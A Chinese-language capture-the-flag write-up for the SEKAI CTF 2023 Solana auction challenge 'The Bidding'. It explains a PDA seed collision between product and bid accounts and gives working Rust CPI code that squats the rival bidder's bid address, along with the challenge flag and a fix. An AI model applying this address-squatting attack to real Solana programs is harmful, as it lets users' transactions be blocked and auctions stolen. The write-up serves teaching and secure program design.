# The Bidding

## 题目简述

题目是 Anchor/Solana 拍卖程序。服务器先创建商品与拍卖，给普通 `user` 账户 $10^9$ lamports，给 `rich_boi` $5\times10^{14}$ lamports；随后依次执行玩家上传的 solve program、`rich_boi` 的巨额出价、管理员结束拍卖。只有最终商品所有者是 `user` 才会输出 flag。

直接加价不可行，因为 `rich_boi` 将出价 $10^{14}$ lamports。突破口是不同账户类型复用了同一 PDA seed 命名空间：

```rust
// Product
seeds = [&product_name[..], &product_id]

// BidInfo
seeds = [auction.key().as_ref(), bidder.key().as_ref()]
```

两者都由同一个 challenge program 派生，且没有额外加入 `"product"`、`"bid"` 之类的类型域分隔。

## 解题过程

服务器会提前打印 `auction`、`product`、`rich_boi` 和 `user` 的公钥。`rich_boi` 的出价账户地址固定为：

```rust
let rich_boi_bid = Pubkey::find_program_address(
    &[auction.as_ref(), rich_boi.as_ref()],
    &chall_id,
).0;
```

而 `CreateProduct` 允许调用者完全控制两段 seed。令：

```rust
let product_name = auction.key().try_to_vec()?;
let product_id = rich_boi.key().to_bytes();
```

则伪造商品的 PDA 与 `rich_boi_bid` 完全相同。这里不是哈希碰撞，而是同一 program 下直接复用了相同的两段字节。

在 solve program 中先通过 CPI 调用 `CreateProduct`，把 `rich_boi_bid` 地址初始化成一个 `Product` 账户：

```rust
let create_accounts = chall::cpi::accounts::CreateProduct {
    product: ctx.accounts.rich_boi_bid.to_account_info(),
    user: ctx.accounts.user.to_account_info(),
    system_program: ctx.accounts.system_program.to_account_info(),
    rent: ctx.accounts.rent.to_account_info(),
};

chall::cpi::create_product(
    CpiContext::new(
        ctx.accounts.chall.to_account_info(),
        create_accounts,
    ),
    product_name,
    product_id,
)?;
```

再为自己创建正常的 `user_bid`，以很小的金额成为当前最高出价者：

```rust
let bid_accounts = chall::cpi::accounts::Bid {
    bid: ctx.accounts.user_bid.to_account_info(),
    auction: ctx.accounts.auction.to_account_info(),
    product: ctx.accounts.product.to_account_info(),
    bidder: ctx.accounts.user.to_account_info(),
    system_program: ctx.accounts.system_program.to_account_info(),
    rent: ctx.accounts.rent.to_account_info(),
};

chall::cpi::bid(
    CpiContext::new(
        ctx.accounts.chall.to_account_info(),
        bid_accounts,
    ),
    727,
)?;
```

玩家指令执行结束后，服务器尝试让 `rich_boi` 调用 `Bid`。该上下文对 `bid` 使用 `#[account(init, ...)]`，但目标 PDA 已经是一个存在的 `Product` 账户，无法再次初始化，所以整个巨额出价交易失败。服务器特意对这次调用使用 `.await.ok()` 忽略错误，之后仍会执行 `EndAuction`。

此时拍卖记录中的唯一有效最高出价者仍是 `user`，`EndAuction` 将：

```rust
product.owner = auction.winning_bid_owner;
```

于是校验通过。官方仓库通过环境变量注入 flag；[比赛参与者的复现记录](https://lkmidas.github.io/posts/20230828-sekaictf2023-writeups/) 给出的结果为：

```text
SEKAI{w0nt_th3se_g3ntlem3n_suff1ce}
```

## 方法总结

Solana PDA 不携带账户类型信息，类型隔离必须由 seed 设计者主动完成。`Product` 与 `BidInfo` 共用可控的两段 seed，使攻击者能够提前占用另一个用户未来必须 `init` 的地址，形成账户地址抢注式拒绝服务。修复方式是在每种账户的 seeds 中加入固定域分隔，例如 `b"product"` 与 `b"bid"`，并避免让任意输入直接覆盖完整命名空间。
